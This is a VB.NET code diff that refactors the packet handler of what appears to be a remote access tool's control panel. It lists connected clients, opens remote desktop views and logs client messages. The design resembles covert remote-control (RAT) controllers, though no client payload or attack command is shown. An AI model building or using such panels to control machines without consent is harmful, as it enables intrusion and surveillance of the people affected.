@@ -5,17 +5,17 @@
     Delegate Sub _Read(ByVal CurrentClient As Client, ByVal Data() As Byte)
 
     Public Shared Sub Read(ByVal CurrentClient As Client, ByVal Data() As Byte)
-        If F.InvokeRequired Then
-            F.BeginInvoke(New _Read(AddressOf Read), New Object() {CurrentClient, Data})
-            Exit Sub
-        Else
-            Try
-                Dim Packer As New Pack
-                Dim itm As Object() = Packer.Deserialize(AES_Decryptor(Data))
+        Try
+            Dim Packer As New Pack
+            Dim itm As Object() = Packer.Deserialize(AES_Decryptor(Data))
 
-                Select Case itm(0)
+            Select Case itm(0)
 
-                    Case PacketHeader.identification
+                Case PacketHeader.identification
+                    If F.LV1.InvokeRequired Then
+                        F.LV1.BeginInvoke(New _Read(AddressOf Read), New Object() {CurrentClient, Data})
+                        Exit Sub
+                    Else
                         CurrentClient.LV = New ListViewItem
                         CurrentClient.LV.Tag = CurrentClient
                         CurrentClient.LV.Text = String.Concat(CurrentClient.IP.Split(":")(0), ":", CurrentClient.ClientSocket.LocalEndPoint.ToString.Split(":")(1))
@@ -25,23 +25,34 @@
                         Next
                         CurrentClient.LV.SubItems.Add(0)
                         F.LV1.Items.Insert(0, CurrentClient.LV)
-                        F.LV1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                         ClinetLog(CurrentClient, "Connected", Color.Green)
-                        Exit Select
+                        Settings.Online.Add(CurrentClient)
+                    End If
+                    Exit Select
 
-                    Case PacketHeader.RemoteDesktopOpen
+                Case PacketHeader.RemoteDesktopOpen
+                    If F.InvokeRequired Then
+                        F.BeginInvoke(New _Read(AddressOf Read), New Object() {CurrentClient, Data})
+                        Exit Sub
+                    Else
                         Dim RD As RemoteDesktop = My.Application.OpenForms("RD" + CurrentClient.IP)
                         If RD Is Nothing Then
-                            RD = New RemoteDesktop
-                            RD.F = F
-                            RD.C = CurrentClient
-                            RD.Name = "RD" + CurrentClient.IP
-                            RD.Text = " Remote Desktop " + CurrentClient.IP.Split(":")(0)
+                            RD = New RemoteDesktop With {
+                            .F = F,
+                            .C = CurrentClient,
+                            .Name = "RD" + CurrentClient.IP,
+                            .Text = " Remote Desktop " + CurrentClient.IP.Split(":")(0)
+                        }
                             RD.Show()
                         End If
-                        Exit Select
+                    End If
+                    Exit Select
 
-                    Case PacketHeader.RemoteDesktopSend
+                Case PacketHeader.RemoteDesktopSend
+                    If F.InvokeRequired Then
+                        F.BeginInvoke(New _Read(AddressOf Read), New Object() {CurrentClient, Data})
+                        Exit Sub
+                    Else
                         Dim RD As RemoteDesktop = My.Application.OpenForms("RD" + CurrentClient.IP)
                         If RD IsNot Nothing Then
                             RD.Text = " Remote Desktop " + CurrentClient.IP.Split(":")(0) + " [" + _Size(itm(1).LongLength) + "]"
@@ -53,27 +64,27 @@
                                 Pending.Req_Out.Add(ClientReq)
                             End If
                         End If
-                        Exit Select
+                    End If
+                    Exit Select
 
-                    Case PacketHeader.ErrorMassages
-                        ClinetLog(CurrentClient, itm(1), Color.Black)
-                        Exit Select
+                Case PacketHeader.ErrorMassages
+                    ClinetLog(CurrentClient, itm(1), Color.Black)
+                    Exit Select
 
-                    Case PacketHeader.MsgReceived
-                        CurrentClient.LV.ForeColor = Nothing
-                        Exit Select
+                Case PacketHeader.MsgReceived
+                    CurrentClient.LV.ForeColor = Nothing
+                    Exit Select
 
 
-                    Case PacketHeader.Ping
-                        Debug.WriteLine("Client just pinged me!")
-                        Exit Select
+                Case PacketHeader.Ping
+                    Debug.WriteLine("Client just pinged me!")
+                    Exit Select
 
-                End Select
-            Catch ex As Exception
-                Debug.WriteLine("Messages " + ex.Message)
-                ClinetLog(Nothing, ex.Message, Color.Red)
-            End Try
-        End If
+            End Select
+        Catch ex As Exception
+            Debug.WriteLine("Messages " + ex.Message)
+            ClinetLog(Nothing, ex.Message, Color.Red)
+        End Try
     End Sub
 
     Delegate Sub _ClinetLog(ByVal CL As Client, ByVal Msg As String, ByVal Color As Color)
